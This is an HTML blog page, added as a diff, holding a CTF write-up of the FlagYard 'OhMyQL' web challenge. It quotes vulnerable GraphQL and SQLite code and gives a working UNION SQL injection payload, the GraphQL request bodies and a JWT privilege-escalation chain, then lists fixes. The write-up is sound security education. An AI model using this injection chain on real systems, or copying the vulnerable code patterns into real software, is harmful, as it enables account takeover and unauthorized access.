@@ -1,0 +1,260 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A GraphQL login mutation that signs whatever username you hand it. The DB layer concatenates strings into SQL. The flag gate just compares your JWT to your own input.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="FlagYard: OhMyQL · 0xAdham">
+  <meta property="og:description" content="A GraphQL login mutation that signs whatever username you hand it. The DB layer concatenates strings into SQL. The flag gate just compares your JWT to your own input.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>FlagYard: OhMyQL · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">FlagYard: OhMyQL</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-05-26</span>
+        <span>CTF · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> FlagYard<br />
+<strong>Challenge:</strong> OhMyQL<br />
+<strong>Category:</strong> Web<br />
+<strong>Difficulty:</strong> Medium</p>
+<h2>What We're Looking At</h2>
+<p>The handout drops two files. <code>index.js</code> is an Express app with a GraphQL endpoint, JWT auth, and a single flag route. <code>database.js</code> is a thin SQLite wrapper with one function. That's the whole attack surface.</p>
+<p>The flag lives at <code>GET /admin</code>. Pulling it requires a JWT where <code>flagOwner === true</code>.</p>
+<pre><code class="language-js">app.get('/admin', (req, res) =&gt; {
+  const token = req.headers.authorization;
+  let user;
+  try {
+    if (token &amp;&amp; token.startsWith('Bearer ')) {
+      user = jwt.verify(token.replace('Bearer ', ''), JWT_SECRET);
+    }
+  } catch (e) {
+    return res.status(403).send('Forbidden');
+  }
+  if (!user || user.flagOwner !== true) {
+    return res.status(403).send('Forbidden');
+  }
+  res.send(process.env.FLAG);
+});
+</code></pre>
+<p>No key confusion. No <code>alg:none</code>. The JWT is signed properly with a server secret. The token is real. So the question becomes: how do we get the server to hand us one with <code>flagOwner: true</code>?</p>
+<h2>Where The Flag JWT Comes From</h2>
+<p>There's exactly one place in the app that issues a token with <code>flagOwner: true</code>. The <code>setFlagOwner</code> mutation.</p>
+<pre><code class="language-js">setFlagOwner: {
+  type: GraphQLString,
+  args: { username: { type: GraphQLString } },
+  resolve: async (_, { username }, { context }) =&gt; {
+    const { user } = context;
+    if (!user) throw new Error('Not authorized');
+    if (user.username !== username) {
+      throw new Error('You can only set flag for your own account');
+    }
+    const token = jwt.sign({ username, flagOwner: true }, JWT_SECRET, { expiresIn: '6m' });
+    return token;
+  }
+}
+</code></pre>
+<p>Read that gate carefully. It doesn't verify the username exists in the database. It doesn't check roles. It just compares the username in your JWT to the username you sent as an argument. Same string, you pass.</p>
+<p>Which means if I can get any JWT at all where I control the username field, I can echo that same string back to <code>setFlagOwner</code> and walk out with a flag token.</p>
+<p>That kicks the question one step back. How do we get the first JWT?</p>
+<h2>The Login Flow</h2>
+<pre><code class="language-js">login: {
+  type: AuthResponseType,
+  args: {
+    username: { type: GraphQLString },
+    password: { type: GraphQLString }
+  },
+  resolve: async (_, { username, password }, { context }) =&gt; {
+    const user = await db.getUser(username);
+    if (!user || user.password !== password) {
+      throw new Error('Invalid credentials');
+    }
+    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '6m' });
+    return { token };
+  }
+}
+</code></pre>
+<p>Three things to notice.</p>
+<p>The JWT is signed with the <code>username</code> argument, not the username from the database row. Whatever string you pass as <code>username</code>, that's what ends up inside your token.</p>
+<p>The password check is <code>user.password !== password</code>. It compares the password column of whatever row came back to the password you submitted. If the row says password is <code>"abc"</code> and you said <code>"abc"</code>, you're in.</p>
+<p>The user comes from <code>db.getUser(username)</code>. And <code>db.getUser</code> is where things get fun.</p>
+<h2>The DB Layer</h2>
+<pre><code class="language-js">const getUser = (username) =&gt; {
+  return new Promise((resolve, reject) =&gt; {
+    const query = `SELECT * FROM users WHERE username = '${username}'`;
+    db.get(query, (err, row) =&gt; {
+      if (err) reject(err);
+      else resolve(row);
+    });
+  });
+};
+</code></pre>
+<p>Template literal. Raw string interpolation. No parameter binding. The username goes straight into the SQL query.</p>
+<p>The database also starts empty. No seed data, no register endpoint, no users at all. So a legitimate login is impossible. The only way the login mutation returns a row is if we inject one.</p>
+<p>The chain is forced.</p>
+<h2>A Quick Peek At The Client</h2>
+<p>The login page ships a small jQuery snippet that tells us exactly how the front end talks to the server.</p>
+<pre><code class="language-html">&lt;script&gt;
+  $('#loginButton').on('click', async function() {
+      const username = $('#username').val();
+      const password = $('#password').val();
+
+      const query = `
+          mutation Login($username: String!, $password: String!) {
+              login(username: $username, password: $password) {
+                  token
+              }
+          }
+      `;
+
+      const response = await fetch('/graphql', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ query, variables: { username, password } })
+      });
+
+      const { data, errors } = await response.json();
+      if (!errors) {
+          localStorage.setItem('token', data.login.token);
+          alert(&quot;Logged In !&quot;);
+      }
+  });
+&lt;/script&gt;
+</code></pre>
+<p>Two useful things fall out of this. The mutation is delivered with GraphQL variables, so the username we send travels as a typed JSON string straight into the resolver. Whatever payload we put in <code>username</code> lands in the SQL query untouched by GraphQL parsing. And the issued token gets stored in <code>localStorage</code> under the key <code>token</code>, which is convenient if we want to sanity check what the server gave us from DevTools.</p>
+<h2>The Plan</h2>
+<p>Three bugs, one chain.</p>
+<ol>
+<li>SQL injection in <code>getUser</code> lets us fabricate a fake row with a password we know.</li>
+<li>The login mutation signs the JWT with our chosen username argument, not the row's username.</li>
+<li><code>setFlagOwner</code> only checks that the JWT username string matches the argument string.</li>
+</ol>
+<p>So: inject a row at login time with a password we control, get back a JWT with a username we picked, then echo the same username at <code>setFlagOwner</code> to upgrade the token, then hit <code>/admin</code>.</p>
+<h2>Step 1: The Login Page</h2>
+<p>Standard login form. Username and password fields, nothing else.</p>
+<p><img alt="Login page" src="/blog/ohmyql/login.png" /></p>
+<p>Submit garbage to see what a "no" looks like.</p>
+<p><img alt="Authentication failed in the UI" src="/blog/ohmyql/login-fail.png" /></p>
+<p>And the underlying GraphQL response in Burp.</p>
+<p><img alt="GraphQL Authentication failed response" src="/blog/ohmyql/graphql-fail.png" /></p>
+<pre><code class="language-json">{&quot;errors&quot;:[{&quot;message&quot;:&quot;Authentication failed&quot;,&quot;locations&quot;:[{&quot;line&quot;:3,&quot;column&quot;:25}],&quot;path&quot;:[&quot;login&quot;]}],&quot;data&quot;:{&quot;login&quot;:null}}
+</code></pre>
+<p>Error is generic. The resolver catches every inner exception and rethrows the same string, so no SQL errors leak. Binary outcome only: token or no token.</p>
+<h2>Step 2: SQLi The Login</h2>
+<p>The query becomes <code>SELECT * FROM users WHERE username = '&lt;INPUT&gt;'</code>. Table is empty so a real match is impossible. UNION a fabricated row in. The <code>users</code> table has three columns (<code>username</code>, <code>password</code>, <code>flagowner</code>), so the UNION needs three values.</p>
+<p>Final payload in the <code>username</code> variable:</p>
+<pre><code>' UNION SELECT 'x','pwn',0 -- 
+</code></pre>
+<p>Password field gets <code>pwn</code>. The full GraphQL body:</p>
+<pre><code class="language-json">{
+  &quot;query&quot;: &quot;mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) { token } }&quot;,
+  &quot;variables&quot;: {
+    &quot;username&quot;: &quot;' UNION SELECT 'x','pwn',0 -- &quot;,
+    &quot;password&quot;: &quot;pwn&quot;
+  }
+}
+</code></pre>
+<p>Server happily issues a token.</p>
+<p><img alt="SQLi login returns a JWT" src="/blog/ohmyql/sqli-login.png" /></p>
+<p>Decode the payload at jwt.io.</p>
+<p><img alt="Decoded JWT showing our injected username" src="/blog/ohmyql/jwt-decoded.png" /></p>
+<pre><code class="language-json">{
+  &quot;username&quot;: &quot;' UNION SELECT 'x','pwn',0 -- &quot;,
+  &quot;iat&quot;: 1779794431,
+  &quot;exp&quot;: 1779794791
+}
+</code></pre>
+<p>The JWT username field contains our entire SQL injection string verbatim. That's the controlled identity we need for the next step.</p>
+<h2>Step 3: Call setFlagOwner</h2>
+<p><code>setFlagOwner</code> only cares that the JWT username equals the argument we pass. We have a JWT whose username is that ugly injection string, so we send the same ugly string right back.</p>
+<p>Request body:</p>
+<pre><code class="language-json">{&quot;query&quot;:&quot;mutation { setFlagOwner(username: \&quot;' UNION SELECT 'x','pwn',0 -- \&quot;) }&quot;}
+</code></pre>
+<p>Add the <code>Authorization: Bearer &lt;token&gt;</code> header from Step 2.</p>
+<p>First try, the token had already expired (six minute window, and I was slow). The resolver hits <code>if (!user)</code> and returns "Not authorized".</p>
+<p><img alt="setFlagOwner failing because the JWT expired" src="/blog/ohmyql/setflagowner-expired.png" /></p>
+<p>Re-ran the login to get a fresh JWT, fired immediately.</p>
+<p><img alt="setFlagOwner returns the flag JWT" src="/blog/ohmyql/setflagowner-success.png" /></p>
+<p>Decoded, the new token now carries <code>flagOwner: true</code>.</p>
+<pre><code class="language-json">{
+  &quot;username&quot;: &quot;' UNION SELECT 'x','pwn',0 -- &quot;,
+  &quot;flagOwner&quot;: true,
+  &quot;iat&quot;: 1779794970,
+  &quot;exp&quot;: 1779795330
+}
+</code></pre>
+<h2>Step 4: Hit /admin</h2>
+<pre><code>GET /admin HTTP/1.1
+Host: mhhbzghhbq-0.playat.flagyard.com
+Authorization: Bearer &lt;flagOwner token&gt;
+Connection: close
+</code></pre>
+<p>Server checks the JWT, sees <code>flagOwner === true</code>, returns the flag.</p>
+<p><img alt="Flag" src="/blog/ohmyql/flag.png" /></p>
+<h2>Why It Works</h2>
+<p>Three small mistakes stack on top of each other.</p>
+<p>The DB layer trusts the username string and pastes it straight into SQL. That alone is just classic SQLi.</p>
+<p>The login resolver signs the JWT with the argument the client sent, not the username from the row that actually matched. That promotes a one off SQLi into long lived identity control, because the token outlives the request.</p>
+<p>And the privilege gate at <code>setFlagOwner</code> checks the username argument against the JWT username instead of looking the user up in the database. It treats the token as the source of truth about who you are, which is fine, except the token's contents were already attacker controlled two steps ago.</p>
+<p>None of these bugs is impressive by itself. Together they hand you the flag.</p>
+<h2>The Fix</h2>
+<ul>
+<li>Parameterize the SQLite query. <code>db.get('SELECT * FROM users WHERE username = ?', [username], cb)</code>.</li>
+<li>Sign the JWT with the username that came back from the database row, not the argument the client passed.</li>
+<li>In <code>setFlagOwner</code>, look the user up again instead of trusting the username inside the JWT to be a real account.</li>
+<li>Drop introspection in production. <code>graphiql: false</code> only hides the IDE, the schema is still queryable.</li>
+</ul>
+<p>GraphQL doesn't make you immune to SQLi. It just moves where the strings come from.</p>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A GraphQL login mutation that signs whatever username you hand it. The DB layer concatenates strings into SQL. The flag gate just compares your JWT to your own input.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-05-26</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">web</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">graphql</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">sqli</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">jwt</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
